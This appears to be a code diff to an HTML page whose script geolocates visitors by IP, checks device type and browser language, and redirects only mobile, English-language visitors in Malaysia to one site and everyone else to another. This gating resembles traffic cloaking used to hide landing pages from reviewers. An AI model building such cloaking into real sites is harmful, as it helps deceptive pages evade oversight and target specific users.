@@ -4,64 +4,78 @@
     <meta charset="UTF-8">
     <script>
         // 白名单配置
-        const TARGET_COUNTRY = 'MY';  // 马来西亚国家代码
-        const TARGET_LANGUAGE = 'en'; // 英文环境
+        const TARGET_COUNTRY = 'MY';
+        const TARGET_LANGUAGE = 'en';
 
-        // 设备检测函数
+        // 设备检测
         const isMobileDevice = () => {
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         };
 
-        // 语言环境检测
+        // 语言检测
         const checkLanguage = () => {
-            const browserLang = navigator.language || navigator.userLanguage;
-            return browserLang.toLowerCase().startsWith(TARGET_LANGUAGE);
-            alert(browserLang.toLowerCase().startsWith(TARGET_LANGUAGE));
+            const lang = navigator.language || navigator.userLanguage;
+            return lang.toLowerCase().startsWith(TARGET_LANGUAGE);
         };
 
-        // 获取地理位置
-        const checkGeoLocation = async () => {
+        // 获取地理信息
+        const getGeoInfo = async () => {
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
-                return data.country === TARGET_COUNTRY;
-                alert(data.country);
+                return {
+                    ip: data.ip,
+                    country: data.country,
+                    city: data.city,
+                    isp: data.org
+                };
             } catch (error) {
-                console.error('Geo check failed:', error);
-                return false;
+                return {
+                    ip: '获取失败',
+                    country: '未知',
+                    city: '未知',
+                    isp: '未知'
+                };
             }
+        };
+
+        // 生成调试信息
+        const generateDebugInfo = (isMobile, language, geo) => {
+            return [
+                '=== 用户信息调试 ===',
+                `语言环境: ${language}`,
+                `设备类型: ${isMobile ? '移动端' : '桌面端'}`,
+                `IP地址: ${geo.ip}`,
+                `国家代码: ${geo.country}`,
+                `城市: ${geo.city}`,
+                `运营商: ${geo.isp}`,
+                `用户代理: ${navigator.userAgent}`
+            ].join('\n');
         };
 
         // 主验证流程
         const validateAccess = async () => {
-            // 设备类型检查
             const isMobile = isMobileDevice();
-            // 语言环境检查
-            const isTargetLang = checkLanguage();
-            // 地理检查
-            const isInTargetCountry = await checkGeoLocation();
-
+            const language = navigator.language || navigator.userLanguage;
+            const geo = await getGeoInfo();
+            
+            // 显示调试信息
+            alert(generateDebugInfo(isMobile, language, geo));
+            
             // 最终验证
-            if (isMobile && isTargetLang && isInTargetCountry) {
-              alert(isMobile + ' ' + isTargetLang + ' ' + isInTargetCountry);
-                // window.location.replace('https://www.qq.com');
+            if (isMobile && checkLanguage() && geo.country === TARGET_COUNTRY) {
+                window.location.replace('https://www.qq.com');
             } else {
-             alert(isMobile + ' ' + isTargetLang + ' ' + isInTargetCountry);
-                //window.location.replace('https://www.baidu.com');
+                window.location.replace('https://www.baidu.com');
             }
         };
 
-        // 页面加载立即执行
         validateAccess();
     </script>
 </head>
 <body>
-    <!-- 备用内容 -->
     <noscript>
-        <h1>Please enable JavaScript to continue</h1>
+        <h1>请启用JavaScript以继续</h1>
     </noscript>
-    <div id="loading" style="display:none;">
-        Checking access...
-    </div>
 </body>
 </html>
